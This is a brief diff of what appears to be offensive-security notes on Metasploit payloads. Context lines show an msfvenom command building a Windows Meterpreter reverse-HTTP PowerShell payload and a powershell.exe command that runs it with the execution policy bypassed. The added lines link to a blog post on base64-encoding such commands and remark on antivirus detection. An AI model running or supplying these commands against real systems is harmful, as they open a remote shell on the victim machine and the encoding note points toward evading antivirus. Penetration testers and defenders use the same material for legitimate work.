@@ -13,3 +13,9 @@ msfvenom -p windows/meterpreter_reverse_http -format psh -out meterpreter-32.ps1
 ```
 powershell.exe -ExecutionPolicy Bypass -NoExit -File meterpreter-64.ps1
 ```
+
+# Didier Steven's base64 encoding
+(also caught by some virii but still cool)
+https://blog.didierstevens.com/2017/08/26/quickpost-metasploit-powershell-base64-commands/
+
+
